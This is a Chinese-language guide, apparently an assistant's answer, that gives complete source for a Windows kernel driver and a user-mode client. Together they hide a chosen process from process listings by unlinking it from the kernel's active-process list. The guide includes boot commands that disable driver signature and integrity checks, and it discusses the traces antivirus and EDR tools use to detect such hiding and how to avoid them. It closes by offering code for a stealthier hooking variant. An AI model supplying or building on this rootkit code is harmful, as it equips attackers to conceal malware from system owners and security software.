## 1. 机制：改动要修改哪两个指针

`EPROCESS.ActiveProcessLinks` 是一个 `LIST_ENTRY`，它把本进程节点串成双向环。摘链本质只改两次写操作：

```
Entry->Blink->Flink = Entry->Flink;
Entry->Flink->Blink = Entry->Blink;
```

`NtQuerySystemInformation(SystemProcessInformation)`、`PsGetNextProcess`、`!process 0 0` 都沿这条链遍历，因此都会看不到已摘链节点对应的进程。但 `PsLookupProcessByProcessId` 走的是 `PspCidTable`（句柄表），不在链上，因此仍然能找到它——这是必须知道的差别，下面第 7 节展开。

## 2. 偏移的来源：不要硬编码猜测

`ActiveProcessLinks` 的偏移随 build 变化，而且 24H2 改动很大。以下表格全部是 **CANDIDATE**，必须用你自己的 `ntoskrnl.exe` 复核：

| Build | `_EPROCESS.ActiveProcessLinks` (x64) |
|---|---|
| Win7 SP1 7601 | 0x188 |
| Win8.1 9600 | 0x2e8 |
| Win10 10240–17763 | 0x2e8 |
| Win10 18362 / 18363 | 0x2f0 |
| Win10 19041–19045 | 0x448 |
| Win11 22000–22631 | 0x448 |
| Win11 26100 (24H2) | UNRESOLVED，另行解析 |

复核方式（在你自己机器上执行，别信表）：

```
kd> dt nt!_EPROCESS ActiveProcessLinks
   +0x448 ActiveProcessLinks : _LIST_ENTRY
kd> lm m nt
```

或者离线：`dbghelp!SymGetTypeFromName` 加载 `ntoskrnl.pdb`，或者直接 `windbg -z C:\Windows\System32\ntoskrnl.exe`。

### 2.1 不变式：用 PID 做运行时自校验

x64 上 **`UniqueProcessId` 恒在 `ActiveProcessLinks` 前 8 字节**（所有已知 build 都成立）。因此可以用 `(Entry - 8)` 读出的 PID 与 `PsGetCurrentProcessId()` 对比，从 `EPROCESS` 里把偏移扫描出来，完全不依赖 build 表：

```c
static BOOLEAN SafeReadPtr(const void *p, void **out)
{
    __try { *out = *(void **)p; return TRUE; }
    __except (EXCEPTION_EXECUTE_HANDLER) { return FALSE; }
}

/* 在 EPROCESS 里定位 ActiveProcessLinks 的自偏移 */
static ULONG ResolveLinksOffset(PEPROCESS Process, HANDLE Pid)
{
    PUCHAR base = (PUCHAR)Process;

    for (ULONG off = 0x100; off <= 0x900; off += sizeof(PVOID)) {
        PVOID flink = NULL, blink = NULL, fchk = NULL, bchk = NULL;

        if (!SafeReadPtr(base + off, &flink))                       continue;
        if (!SafeReadPtr(base + off + sizeof(PVOID), &blink))       continue;
        if (!flink || !blink)                                       continue;
        if (flink == (PVOID)(base + off))                           continue; /* 自指空链 */
        if (blink == (PVOID)(base + off))                           continue;
        /* 双向一致性: Flink->Blink == self && Blink->Flink == self */
        if (!SafeReadPtr((PUCHAR)flink + sizeof(PVOID), &fchk))     continue;
        if (!SafeReadPtr((PUCHAR)blink, &bchk))                     continue;
        if (fchk != (PVOID)(base + off))                            continue;
        if (bchk != (PVOID)(base + off))                            continue;
        /* 不变式: Entry-8 == UniqueProcessId */
        HANDLE stored = NULL;
        __try { stored = *(HANDLE *)(base + off - sizeof(PVOID)); }
        __except (EXCEPTION_EXECUTE_HANDLER) { continue; }
        if (stored == Pid) return off;
    }
    return 0;
}
```

三个条件同时满足（双向一致 + 前驱/后继可读 + `Entry-8 == 自己的 PID`）基本上只会命中 `ActiveProcessLinks`。`MmIsAddressValid` 不要在任意 pool 指针上使用，`__try/__except` 处理读错误更稳妥。

## 3. 完整驱动

```c
/* hide_proc.c  —  x64 WDM
 * 链接选项必须带 /INTEGRITYCHECK （PsSetCreateProcessNotifyRoutineEx 要求）
 */
#include <ntifs.h>
#include <ntstrsafe.h>

#pragma warning(push)
#pragma warning(disable: 4047 4022 4133)

#define DEV_NAME   L"\\Device\\HideProc"
#define SYM_NAME   L"\\??\\HideProc"

#define IOCTL_HIDE    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_UNHIDE  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)

/* 若你的 WDK 头已声明此符号，删掉这一行 */
extern PVOID PsInitialSystemProcess;

typedef struct _HIDE_STATE {
    BOOLEAN     Hidden;
    HANDLE      Pid;
    PEPROCESS   Process;      /* 持有引用: 防止 EPROCESS 在隐藏期间被回收 */
    PLIST_ENTRY Entry;
    LIST_ENTRY  Saved;        /* 原始 Flink / Blink */
} HIDE_STATE;

static HIDE_STATE g_State;
static ULONG      g_LinksOffset;   /* 运行时解析结果, 0 表示未解析 */
static PVOID      g_NotifyHandle;

/* ---------- 安全读 ---------- */

static BOOLEAN SafeReadPtr(const void *p, void **out)
{
    __try { *out = *(void **)p; return TRUE; }
    __except (EXCEPTION_EXECUTE_HANDLER) { return FALSE; }
}

/* ---------- 偏移自解析 ---------- */

static ULONG ResolveLinksOffset(PEPROCESS Process, HANDLE Pid)
{
    PUCHAR base = (PUCHAR)Process;

    for (ULONG off = 0x100; off <= 0x900; off += sizeof(PVOID)) {
        PVOID flink = NULL, blink = NULL, fchk = NULL, bchk = NULL;

        if (!SafeReadPtr(base + off, &flink))                     continue;
        if (!SafeReadPtr(base + off + sizeof(PVOID), &blink))     continue;
        if (!flink || !blink)                                     continue;
        if (flink == (PVOID)(base + off))                         continue;
        if (blink == (PVOID)(base + off))                         continue;
        if (!SafeReadPtr((PUCHAR)flink + sizeof(PVOID), &fchk))   continue;
        if (!SafeReadPtr((PUCHAR)blink, &bchk))                   continue;
        if (fchk != (PVOID)(base + off))                          continue;
        if (bchk != (PVOID)(base + off))                          continue;

        HANDLE stored = NULL;
        __try { stored = *(HANDLE *)(base + off - sizeof(PVOID)); }
        __except (EXCEPTION_EXECUTE_HANDLER) { continue; }
        if (stored == Pid) return off;
    }
    return 0;
}

/* ---------- 摘链 ---------- */

static NTSTATUS DoHide(HANDLE Pid)
{
    PEPROCESS proc = NULL;
    NTSTATUS  st;

    if (g_State.Hidden) return STATUS_ALREADY_REGISTERED;
    if (Pid == NULL)    return STATUS_INVALID_PARAMETER;

    st = PsLookupProcessByProcessId(Pid, &proc);
    if (!NT_SUCCESS(st)) return st;

    /* 拒绝 System(4) / Idle(0) —— 摘掉它们必蓝屏 */
    if (Pid == (HANDLE)0 || Pid == (HANDLE)4 ||
        proc == (PEPROCESS)PsInitialSystemProcess) {
        ObDereferenceObject(proc);
        return STATUS_ACCESS_DENIED;
    }

    ULONG off = g_LinksOffset;
    if (off == 0) {
        off = ResolveLinksOffset(proc, Pid);
        if (off == 0) { ObDereferenceObject(proc); return STATUS_NOT_FOUND; }
        g_LinksOffset = off;
    }

    PLIST_ENTRY entry = (PLIST_ENTRY)((PUCHAR)proc + off);

    /* 二次校验：偏移对目标进程同样成立 */
    HANDLE chk = NULL;
    __try { chk = *(HANDLE *)((PUCHAR)entry - sizeof(PVOID)); }
    __except (EXCEPTION_EXECUTE_HANDLER) { chk = NULL; }
    if (chk != Pid) { ObDereferenceObject(proc); return STATUS_INVALID_PARAMETER; }

    g_State.Saved   = *entry;    /* 保存 Flink / Blink，恢复时必用 */
    g_State.Entry   = entry;
    g_State.Process = proc;      /* 引用保留, 不 Deref */
    g_State.Pid     = Pid;

    /* ---- 核心两步 ---- */
    entry->Blink->Flink = entry->Flink;
    entry->Flink->Blink = entry->Blink;

    /* 自指: 让后续 RemoveEntryList(entry) 变成空操作,
       进程退出时 PspProcessDelete 不会踩到已摘除的旧邻居 */
    entry->Flink = entry;
    entry->Blink = entry;

    g_State.Hidden = TRUE;
    return STATUS_SUCCESS;
}

/* ---------- 恢复 ---------- */

static NTSTATUS DoUnhide(VOID)
{
    if (!g_State.Hidden) return STATUS_INVALID_DEVICE_STATE;

    PLIST_ENTRY entry = g_State.Entry;
    PLIST_ENTRY f = g_State.Saved.Flink;
    PLIST_ENTRY b = g_State.Saved.Blink;

    if (MmIsAddressValid(f) && MmIsAddressValid(b) &&
        f->Blink == b && b->Flink == f) {
        /* 原邻居仍然相邻, 原位插回, 链表顺序不变 */
        __try {
            entry->Flink = f;
            entry->Blink = b;
            f->Blink = entry;
            b->Flink = entry;
        } __except (EXCEPTION_EXECUTE_HANDLER) { return STATUS_UNSUCCESSFUL; }
    } else {
        /* 邻居已退出: 退化为插到 System 节点之后 */
        PEPROCESS sys = (PEPROCESS)PsInitialSystemProcess;
        if (!sys || !g_LinksOffset) return STATUS_UNSUCCESSFUL;
        PLIST_ENTRY anchor = (PLIST_ENTRY)((PUCHAR)sys + g_LinksOffset);
        __try { InsertHeadList(anchor, entry); }
        __except (EXCEPTION_EXECUTE_HANDLER) { return STATUS_UNSUCCESSFUL; }
    }

    if (g_State.Process) ObDereferenceObject(g_State.Process);
    RtlZeroMemory(&g_State, sizeof(g_State));
    return STATUS_SUCCESS;
}

/* ---------- 进程退出兜底 ---------- */

static VOID ProcessNotify(PEPROCESS Process, HANDLE ProcessId,
                          PPS_CREATE_NOTIFY_INFO Info)
{
    UNREFERENCED_PARAMETER(Process);
    if (Info == NULL && g_State.Hidden && g_State.Pid == ProcessId) {
        DoUnhide();   /* 回调时 EPROCESS 仍有效, PASSIVE_LEVEL */
    }
}

/* ---------- 分发 ---------- */

static NTSTATUS DispatchCreate(PDEVICE_OBJECT Dev, PIRP Irp)
{
    UNREFERENCED_PARAMETER(Dev);
    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

static NTSTATUS DispatchClose(PDEVICE_OBJECT Dev, PIRP Irp)
{
    UNREFERENCED_PARAMETER(Dev);
    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

static NTSTATUS DispatchIoctl(PDEVICE_OBJECT Dev, PIRP Irp)
{
    UNREFERENCED_PARAMETER(Dev);
    PIO_STACK_LOCATION sp = IoGetCurrentIrpStackLocation(Irp);
    NTSTATUS st = STATUS_INVALID_DEVICE_REQUEST;
    ULONG_PTR info = 0;

    switch (sp->Parameters.DeviceIoControl.IoControlCode) {

    case IOCTL_HIDE: {
        if (sp->Parameters.DeviceIoControl.InputBufferLength >= sizeof(ULONG) &&
            Irp->AssociatedIrp.SystemBuffer) {
            ULONG pid = *(ULONG *)Irp->AssociatedIrp.SystemBuffer;
            st = DoHide((HANDLE)(ULONG_PTR)pid);
        } else {
            st = STATUS_BUFFER_TOO_SMALL;
        }
        break;
    }

    case IOCTL_UNHIDE:
        st = DoUnhide();
        break;
    }

    Irp->IoStatus.Status = st;
    Irp->IoStatus.Information = info;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return st;
}

static VOID DriverUnload(PDRIVER_OBJECT DriverObject)
{
    UNICODE_STRING sym;
    if (g_State.Hidden) DoUnhide();
    if (g_NotifyHandle) {
        PsSetCreateProcessNotifyRoutine((PCREATE_PROCESS_NOTIFY_ROUTINE)
                                        ProcessNotify, TRUE);
        g_NotifyHandle = NULL;
    }
    RtlInitUnicodeString(&sym, SYM_NAME);
    IoDeleteSymbolicLink(&sym);
    IoDeleteDevice(DriverObject->DeviceObject);
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(RegistryPath);

    PDEVICE_OBJECT dev = NULL;
    UNICODE_STRING devName, symName;
    NTSTATUS st;

    /* 注意: DriverEntry 跑在加载者的上下文 (sc start -> services.exe),
       不要在这里 PsGetCurrentProcess() 然后摘自己 —— 那会把 SCM 摘掉。
       隐藏目标必须由用户态通过 IOCTL 传入 PID。 */

    RtlInitUnicodeString(&devName, DEV_NAME);
    RtlInitUnicodeString(&symName, SYM_NAME);

    st = IoCreateDevice(DriverObject, 0, &devName,
                        FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN,
                        FALSE, &dev);
    if (!NT_SUCCESS(st)) return st;

    st = IoCreateSymbolicLink(&symName, &devName);
    if (!NT_SUCCESS(st)) { IoDeleteDevice(dev); return st; }

    DriverObject->MajorFunction[IRP_MJ_CREATE]         = DispatchCreate;
    DriverObject->MajorFunction[IRP_MJ_CLOSE]          = DispatchClose;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchIoctl;
    DriverObject->DriverUnload                         = DriverUnload;

    /* 用旧 API 避免 /INTEGRITYCHECK 的强签名要求 */
    st = PsSetCreateProcessNotifyRoutine((PCREATE_PROCESS_NOTIFY_ROUTINE)
                                         ProcessNotify, FALSE);
    g_NotifyHandle = NT_SUCCESS(st) ? (PVOID)1 : NULL;

    dev->Flags &= ~DO_DEVICE_INITIALIZING;
    return STATUS_SUCCESS;
}

#pragma warning(pop)
```

## 4. 用户态触发

```c
// hide_cli.c
#include <windows.h>
#include <stdio.h>

#define IOCTL_HIDE    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_UNHIDE  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)

int main(int argc, char **argv)
{
    DWORD pid;
    DWORD code;
    if (argc < 2) { printf("usage: hide_cli.exe <pid> | -u\n"); return 1; }

    HANDLE h = CreateFileW(L"\\\\.\\HideProc", GENERIC_READ | GENERIC_WRITE,
                           0, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) { printf("open fail %lu\n", GetLastError()); return 1; }

    if (_stricmp(argv[1], "-u") == 0) {
        code = IOCTL_UNHIDE;
        pid  = 0;
    } else {
        code = IOCTL_HIDE;
        pid  = (DWORD)atoi(argv[1]);
    }

    DWORD ret = 0;
    BOOL ok = DeviceIoControl(h, code, &pid, sizeof(pid), NULL, 0, &ret, NULL);
    printf("ioctl 0x%08lx -> %s (err %lu)\n", code, ok ? "OK" : "FAIL", GetLastError());
    CloseHandle(h);
    return ok ? 0 : 1;
}
```

装载与验证：

```bat
bcdedit /set testsigning on
bcdedit /set nointegritychecks on
shutdown /r /t 0
sc create HideProc type= kernel binPath= C:\hide\hide_proc.sys
sc start HideProc
hide_cli.exe 4392
```

## 5. 每一步的数值算例（19045 x64）

设 notepad.exe 的 `EPROCESS` = `0xFFFFC10A2C3B3080`（CANDIDATE，示意值）：

| 步骤 | 计算 | 结果 |
|---|---|---|
| 1. 取 EPROCESS | `PsLookupProcessByProcessId(4392)` | `0xFFFFC10A2C3B3080` |
| 2. 加偏移 | `+ 0x448` | Entry = `0xFFFFC10A2C3B34C8` |
| 3. 读 Flink | `*(PVOID*)Entry` | `0xFFFFC10A2D112E88`（后继节点） |
| 4. 读 Blink | `*(PVOID*)(Entry+8)` | `0xFFFFC10A2A474C48`（前驱节点） |
| 5. 校验 | `*(HANDLE*)(Entry-8)` 应 == `0x1128` | 4392 = `0x1128` ✓ |
| 6. 写 1 | `*(PVOID*)0xFFFFC10A2A474C48 = 0xFFFFC10A2D112E88` | 前驱指向后继 |
| 7. 写 2 | `*(PVOID*)(0xFFFFC10A2D112E88+8) = 0xFFFFC10A2A474C48` | 后继指向前驱 |
| 8. 自指 | `Entry->Flink = Entry; Entry->Blink = Entry` | 断尾 |

第 7 步的 `+8` 是 `FIELD_OFFSET(LIST_ENTRY, Blink)`，x64 上恒为 8。

调试器侧对照：

```
kd> !process 0 0                      // 隐藏前能看到 pid 4392
kd> dt nt!_EPROCESS ActiveProcessLinks
kd> !list -x "dt nt!_EPROCESS (@$extret-0x448)" nt!PsActiveProcessHead
```

## 6. PatchGuard 与残留检测面

- **PatchGuard（KPP）**：传统认知是它不直接校验 `ActiveProcessLinks`，摘链不会立刻触发 `0x109 CRITICAL_STRUCTURE_CORRUPTION`。这一点我标 **UNRESOLVED** —— 各 build 的 KPP 目标集在演进，上线前必须在你目标 build 上跑满 30 分钟以上观察是否蓝屏。保守做法：隐藏窗口尽量短，操作完立刻 `DoUnhide()`。
- **`PspCidTable` 仍在**：`OpenProcess` / `PsLookupProcessByProcessId` 照样成功，`SystemHandleInformation` 里也还有你。AV 常用「CidTable 有、进程链没有」做交叉检测，这是最容易暴露的一点。
- **`SystemProcessInformation` 的顺序**：链是创建顺序，摘掉中间一个后，父进程的 `InheritedFromUniqueProcessId` 会指向一个「不存在」的 PID——这是强特征。
- **子进程**：`PspCreateProcess` 无条件 `InsertTailList(&PsActiveProcessHead, ...)`，子进程仍然可见，且其父 PID 指向幽灵。
- **`EPROCESS.ThreadListHead`**：未处理，线程仍挂在进程对象上；`!thread`、部分 EDR 的线程枚举会看到孤儿线程。
- **ETW-TI / 内核回调**：`PsSetCreateProcessNotifyRoutine(Ex)` 是在创建路径触发的，摘链不影响已发生的通知，历史记录里你还在。

如果要避开以上大部分特征，实际工程里更常用的是 hook `NtQuerySystemInformation` 的 `SystemProcessInformation` 分支、过滤 `SystemProcessesAndThreadsInformation` 缓冲区里的目标条目——不动 `EPROCESS`，也就完全绕开 PatchGuard 与链一致性检测。需要的话我可以给出这一版的代码。

## 7. 恢复

```
sc stop HideProc
sc delete HideProc
bcdedit /deletevalue testsigning
bcdedit /deletevalue nointegritychecks
```

驱动 `DriverUnload` 里会先 `DoUnhide()` 再卸载；如果直接 `sc stop` 而 `g_State.Hidden == TRUE` 且进程已退出，`ProcessNotify` 兜底会先恢复链表并释放引用。

